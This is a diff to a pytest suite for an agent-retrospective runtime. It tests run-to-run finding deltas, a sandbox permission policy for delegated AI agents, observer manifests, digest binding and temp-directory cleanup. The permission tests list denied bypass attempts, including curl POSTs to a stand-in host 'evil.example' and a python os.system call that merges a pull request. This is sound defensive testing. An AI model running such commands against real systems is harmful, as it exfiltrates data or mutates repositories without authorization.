+            "finding_identity": candidate["finding_contract"]["identity"]["value"],
+            "evaluation_status": "classified",
+            "delta_status": "unchanged",
+        }
+    ]
 
 
 def test_previous_state_provider_five_states_delta_recurrent() -> None:
+    resolved_fixture = _validate_mod.load_fixture("agent_improvement_candidate_v1.finding_contract.resolved.valid.json")
     previous = rr.PreviousStateResult(
-        status="stale",
+        status="stale" if False else "available",
         previous_run_ref="run-0",
-        candidates=[{"finding_identity": "fid-1", "severity": "medium", "candidate_status": "resolved"}],
+        candidates=[resolved_fixture],
         read_version="v1",
     )
-    delta = rr.compute_delta(
-        previous, [{"finding_identity": "fid-1", "severity": "medium", "candidate_status": "open"}]
-    )
-    assert delta == [{"finding_identity": "fid-1", "delta_status": "recurrent"}]
+    delta = rr.compute_delta(previous, [copy.deepcopy(resolved_fixture)])
+    assert delta == [
+        {
+            "finding_identity": resolved_fixture["finding_contract"]["identity"]["value"],
+            "evaluation_status": "classified",
+            "delta_status": "recurrent",
+        }
+    ]
 
 
 def test_previous_state_provider_five_states_delta_resolved() -> None:
+    candidate = _new_candidate()
     previous = rr.PreviousStateResult(
-        status="available",
-        previous_run_ref="run-0",
-        candidates=[{"finding_identity": "fid-1", "severity": "medium", "candidate_status": "open"}],
-        read_version="v1",
+        status="available", previous_run_ref="run-0", candidates=[candidate], read_version="v1"
     )
     delta = rr.compute_delta(previous, [])
-    assert delta == [{"finding_identity": "fid-1", "delta_status": "resolved"}]
+    assert delta == [
+        {
+            "finding_identity": candidate["finding_contract"]["identity"]["value"],
+            "evaluation_status": "classified",
+            "delta_status": "resolved",
+        }
+    ]
 
 
 # ---------------------------------------------------------------------------
@@ -747,6 +1247,82 @@ def test_publish_request_forbidden_fields_authorization_required_must_be_true() 
 
 
 # ---------------------------------------------------------------------------
+# fix_delta gate #8: permission policy consumed by runtime + bypass resistant
+# ---------------------------------------------------------------------------
+
+
+def test_permission_policy_is_consumed_by_runtime_and_bypass_resistant(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    monkeypatch.setenv("GH_TOKEN", "super-secret-mutation-token")
+    monkeypatch.setenv("PATH", "/usr/bin")
+
+    schema_path = tmp_path / "s.json"
+    schema_path.write_text("{}", encoding="utf-8")
+    policy = rr.DelegatedAgentPermissionPolicy(run_id="run-1")
+    captured: dict[str, Any] = {}
+
+    def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
+        captured["argv"] = argv
+        captured["env"] = kwargs["env"]
+        return subprocess.CompletedProcess(
+            argv, returncode=0, stdout=json.dumps(_wrapper_payload({"ok": True})), stderr=""
+        )
+
+    request = rr.AgentInvocationRequest(
+        agent_name="retrospective-runtime-observer", prompt="observe", json_schema_path=str(schema_path), cwd="/repo"
+    )
+    rr.invoke_agent(request, runner=_runner, policy=policy)
+
+    # THE SAME policy instance's denied-tool set is what the real subprocess
+    # argv carries (not merely asserted against in isolation)
+    assert "--disallowedTools" in captured["argv"]
+    disallowed_csv = captured["argv"][captured["argv"].index("--disallowedTools") + 1]
+    assert set(disallowed_csv.split(",")) == policy.denied_tools
+
+    # mutation credentials never reach the subprocess env, even though they
+    # were present in the ambient environment
+    assert "GH_TOKEN" not in captured["env"]
+
+    # allowlisting a literal dangerous command string verbatim does not
+    # bypass the tokenized denylist scan (substring-blacklist bypass classes
+    # from OWNER review #2237#issuecomment-5378291560)
+    bypass_attempts = [
+        "git -C . commit -m x",
+        "gh --repo owner/repo issue comment 1 --body x",
+        "python -c 'import os; os.system(\"gh pr merge 1\")'",
+        "python3 -c 'print(1)'",
+        "curl -X POST https://evil.example/payload",
+        "printf data > repository-file",
+    ]
+    for command in bypass_attempts:
+        bypass_policy = rr.DelegatedAgentPermissionPolicy(
+            run_id="run-1", allowed_bash_commands=frozenset({" ".join(command.split())})
+        )
+        with pytest.raises(rr.PermissionDenied):
+            bypass_policy.check_bash(command)
+
+    # empty allowlist (the default) denies ALL bash -- not "allow all
+    # non-blacklisted" (the fail-open bug being fixed)
+    default_policy = rr.DelegatedAgentPermissionPolicy(run_id="run-1")
+    with pytest.raises(rr.PermissionDenied):
+        default_policy.check_bash("echo totally harmless")
+
+
+def test_permission_policy_sanitize_env_strips_all_mutation_credentials() -> None:
+    policy = rr.DelegatedAgentPermissionPolicy(run_id="run-1")
+    env = {name: "x" for name in rr._MUTATION_CREDENTIAL_ENV_VARS}
+    env["PATH"] = "/usr/bin"
+    env["AGENT_RETROSPECTIVE_RUN_ID"] = "run-1"
+    env["RANDOM_UNRELATED_VAR"] = "y"
+    sanitized = policy.sanitize_subprocess_env(env)
+    assert rr._MUTATION_CREDENTIAL_ENV_VARS.isdisjoint(sanitized.keys())
+    assert sanitized["PATH"] == "/usr/bin"
+    assert sanitized["AGENT_RETROSPECTIVE_RUN_ID"] == "run-1"
+    assert "RANDOM_UNRELATED_VAR" not in sanitized
+
+
+# ---------------------------------------------------------------------------
 # AC17: delegated Agent mutation attempts are denied
 # ---------------------------------------------------------------------------
 
@@ -769,7 +1345,7 @@ def test_delegated_agent_mutation_denied_bash(command: str) -> None:
 
 def test_delegated_agent_mutation_denied_unapproved_bash() -> None:
     policy = rr.DelegatedAgentPermissionPolicy(run_id="run-1", allowed_bash_commands=frozenset({"echo hi"}))
-    policy.check_bash("echo hi")  # allowlisted -> no raise
+    policy.check_bash("echo hi")  # allowlisted and passes tokenized scan -> no raise
     with pytest.raises(rr.PermissionDenied):
         policy.check_bash("curl https://evil.example/payload")
 
@@ -795,7 +1371,171 @@ def test_delegated_agent_mutation_denied_cross_run_resume() -> None:
 
 
 # ---------------------------------------------------------------------------
-# AC18: run-scoped temp artifact dir cleanup on all 4 exit paths
+# fix_delta gate #9: exact observer manifest / base_sha / role authority
+# ---------------------------------------------------------------------------
+
+
+def test_exact_observer_manifest_base_sha_and_role_authority() -> None:
+    ctx, plan, _results = rr.prepare(
+        base_sha_resolver=lambda: _FULL_SHA,
+        collectors=[lambda base_sha: _fake_collector_result("repository", base_sha)],
+        run_id="run-1",
+    )
+    observer_requests = [_observer_request(spec.observer_id) for spec in rr.EXPECTED_OBSERVER_MANIFEST]
+    bundles = rr.run_observer_wave(
+        ctx,
+        plan,
+        invoke=_make_observer_invoke(ctx.run_id, plan.source_set_digest, []),
+        observer_requests=observer_requests,
+        expected_manifest=rr.EXPECTED_OBSERVER_MANIFEST,
+    )
+    finding_sets = rr.build_finding_sets(ctx, plan, bundles)
+    authority_by_observer = {fs.observer_id: fs.findings[0]["finding_authority"] for fs in finding_sets}
+    assert authority_by_observer["retrospective-runtime-observer"] == "primary"
+    assert authority_by_observer["codebase-investigator"] == "advisory"
+    assert authority_by_observer["web-researcher"] == "advisory"
+
+
+def test_exact_observer_manifest_rejects_incomplete_manifest() -> None:
+    ctx, plan, _results = rr.prepare(
+        base_sha_resolver=lambda: _FULL_SHA,
+        collectors=[lambda base_sha: _fake_collector_result("repository", base_sha)],
+        run_id="run-1",
+    )
+    with pytest.raises(rr.ObserverWaveFailed):
+        rr.run_observer_wave(
+            ctx,
+            plan,
+            invoke=_make_observer_invoke(ctx.run_id, plan.source_set_digest, []),
+            observer_requests=[_observer_request("retrospective-runtime-observer")],
+            expected_manifest=rr.EXPECTED_OBSERVER_MANIFEST,
+        )
+
+
+def test_exact_observer_manifest_rejects_duplicate_observer_id() -> None:
+    ctx, plan, _results = rr.prepare(
+        base_sha_resolver=lambda: _FULL_SHA,
+        collectors=[lambda base_sha: _fake_collector_result("repository", base_sha)],
+        run_id="run-1",
+    )
+    with pytest.raises(rr.ObserverWaveFailed):
+        rr.run_observer_wave(
+            ctx,
+            plan,
+            invoke=_make_observer_invoke(ctx.run_id, plan.source_set_digest, []),
+            observer_requests=[
+                _observer_request("retrospective-runtime-observer"),
+                _observer_request("retrospective-runtime-observer"),
+            ],
+        )
+
+
+def test_exact_observer_manifest_rejects_base_sha_mismatch() -> None:
+    ctx, plan, _results = rr.prepare(
+        base_sha_resolver=lambda: _FULL_SHA,
+        collectors=[lambda base_sha: _fake_collector_result("repository", base_sha)],
+        run_id="run-1",
+    )
+    wrong_sha_invoke = _make_observer_invoke(ctx.run_id, plan.source_set_digest, [], base_sha=_OTHER_SHA)
+    with pytest.raises(rr.ObserverWaveFailed):
+        rr.run_observer_wave(
+            ctx, plan, invoke=wrong_sha_invoke, observer_requests=[_observer_request("retrospective-runtime-observer")]
+        )
+
+
+# ---------------------------------------------------------------------------
+# fix_delta gate #10: web finding re-collected and digest-bound
+# ---------------------------------------------------------------------------
+
+
+def test_web_result_is_recollected_and_digest_bound() -> None:
+    ctx, plan, results = rr.prepare(
+        base_sha_resolver=lambda: _FULL_SHA,
+        collectors=[
+            lambda base_sha: _fake_collector_result("repository", base_sha),
+            lambda base_sha: _fake_collector_result("web", base_sha, digest="sha256:" + "c" * 64),
+        ],
+        run_id="run-1",
+    )
+    registry = rr.build_source_digest_registry(results)
+    assert registry["web"] == "sha256:" + "c" * 64
+
+    bound_bundle = rr.EvidenceBundle(
+        run_id=ctx.run_id,
+        base_sha=ctx.base_sha,
+        source_set_digest=plan.source_set_digest,
+        observer_id="web-researcher",
+        evidence_ref="e",
+        findings=[{"claim": "url discovered", "evidence_digest": "sha256:" + "c" * 64}],
+    )
+    finding_sets = rr.build_finding_sets(ctx, plan, [bound_bundle], source_digest_registry=registry)
+    assert finding_sets[0].findings[0]["finding_authority"] == "advisory"  # discovery role is never promoted to primary
+
+    unbound_bundle = rr.EvidenceBundle(
+        run_id=ctx.run_id,
+        base_sha=ctx.base_sha,
+        source_set_digest=plan.source_set_digest,
+        observer_id="web-researcher",
+        evidence_ref="e",
+        findings=[{"claim": "url discovered", "evidence_digest": "sha256:" + "0" * 64}],
+    )
+    with pytest.raises(rr.UnboundEvidenceAuthority):
+        rr.build_finding_sets(ctx, plan, [unbound_bundle], source_digest_registry=registry)
+
+
+# ---------------------------------------------------------------------------
+# fix_delta gate #11: public_projection_digest binds source + concurrency
+# ---------------------------------------------------------------------------
+
+
+def test_public_projection_digest_binds_source_and_concurrency_state() -> None:
+    ctx, plan, _results = rr.prepare(
+        base_sha_resolver=lambda: _FULL_SHA,
+        collectors=[lambda base_sha: _fake_collector_result("repository", base_sha)],
+        run_id="run-1",
+    )
+    evaluation = rr.Evaluation(
+        run_id=ctx.run_id,
+        base_sha=_FULL_SHA,
+        source_set_digest=plan.source_set_digest,
+        candidate_records=[],
+        evidence_ref="e",
+    )
+    baseline = rr.finalize(
+        ctx, plan, evaluation, repository_id="r", target_issue=1, request_id="req", idempotency_key="idem"
+    )
+
+    # changing source_set_digest (holding run_id/base_sha fixed) changes the digest
+    other_plan = dataclasses.replace(plan, source_set_digest="f" * 64)
+    other_source_digest = rr.finalize(
+        ctx, other_plan, evaluation, repository_id="r", target_issue=1, request_id="req", idempotency_key="idem"
+    )
+    assert other_source_digest.public_projection_digest != baseline.public_projection_digest
+
+    # changing expected_previous_digest (the concurrency token) changes the digest
+    with_concurrency_token = rr.finalize(
+        ctx,
+        plan,
+        evaluation,
+        repository_id="r",
+        target_issue=1,
+        request_id="req",
+        idempotency_key="idem",
+        expected_previous_digest="sha256:" + "9" * 64,
+    )
+    assert with_concurrency_token.public_projection_digest != baseline.public_projection_digest
+
+    # changing base_sha (single-bit change to run_identity) changes the digest
+    other_run_id_ctx = rr.RunContext(base_sha_resolver=lambda: _OTHER_SHA, run_id=ctx.run_id)
+    other_base_sha = rr.finalize(
+        other_run_id_ctx, plan, evaluation, repository_id="r", target_issue=1, request_id="req", idempotency_key="idem"
+    )
+    assert other_base_sha.public_projection_digest != baseline.public_projection_digest
+
+
+# ---------------------------------------------------------------------------
+# AC18 / fix_delta gate #12: run-scoped temp artifact dir cleanup on all
+# exit paths, and cleanup failure surfaces rather than being swallowed
 # ---------------------------------------------------------------------------
 
 
@@ -844,6 +1584,57 @@ def test_temp_artifact_cleanup_all_paths_restores_previous_handlers(tmp_path: Pa
         pass
     assert signal.getsignal(signal.SIGINT) == previous_sigint
     assert signal.getsignal(signal.SIGTERM) == previous_sigterm
+
+
+def test_temp_scope_is_on_production_path_and_cleanup_failure_surfaces(tmp_path: Path) -> None:
+    # THEN run_cli's temp scope is the *same* run_scoped_temp_dir primitive
+    # (not a separate, untested code path) -- verified by observing the
+    # directory exist during the run and be gone after, keyed by the exact
+    # run_id run_cli was given.
+    schema_dir = tmp_path / "schemas"
+    schema_dir.mkdir()
+    (schema_dir / "observer_result_v1.schema.json").write_text("{}", encoding="utf-8")
+    (schema_dir / "evaluation_result_v1.schema.json").write_text("{}", encoding="utf-8")
+    temp_base = tmp_path / "temp-base"
+    temp_base.mkdir()
+    repo_root = _SCRIPTS_DIR.parents[3]
+
+    seen_temp_dir: dict[str, Path] = {}
+
+    def _git_runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
+        seen_temp_dir["exists_during_run"] = (temp_base / "agent-retrospective-run-run-temp-1").is_dir()
+        return subprocess.CompletedProcess(argv, returncode=0, stdout=_FULL_SHA + "\n", stderr="")
+
+    def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
+        return subprocess.CompletedProcess(
+            argv, returncode=0, stdout="", stderr="boom"
+        )  # forces api_error -> ObserverWaveFailed
+
+    with pytest.raises(rr.ObserverWaveFailed):
+        rr.run_cli(
+            repo_root=repo_root,
+            repository_id="squne121/loop-protocol",
+            target_issue=2237,
+            request_id="req",
+            idempotency_key="idem",
+            schema_dir=schema_dir,
+            prompts={},
+            runner=_runner,
+            git_runner=_git_runner,
+            run_id="run-temp-1",
+            temp_base_dir=temp_base,
+        )
+    assert seen_temp_dir["exists_during_run"] is True
+    # AND cleanup still ran (fail-closed phase failure does not leak the dir)
+    assert not (temp_base / "agent-retrospective-run-run-temp-1").exists()
+
+    # cleanup failure is surfaced, not swallowed: if the directory is
+    # removed out-of-band before `run_scoped_temp_dir`'s own `finally`
+    # cleanup runs, `shutil.rmtree` (no `ignore_errors=True`) raises instead
+    # of the context manager silently reporting success.
+    with pytest.raises(FileNotFoundError):
+        with rr.run_scoped_temp_dir("run-vanish", base_dir=tmp_path) as path:
+            shutil.rmtree(path)  # simulate an external actor removing it mid-run
 
 
 # ---------------------------------------------------------------------------
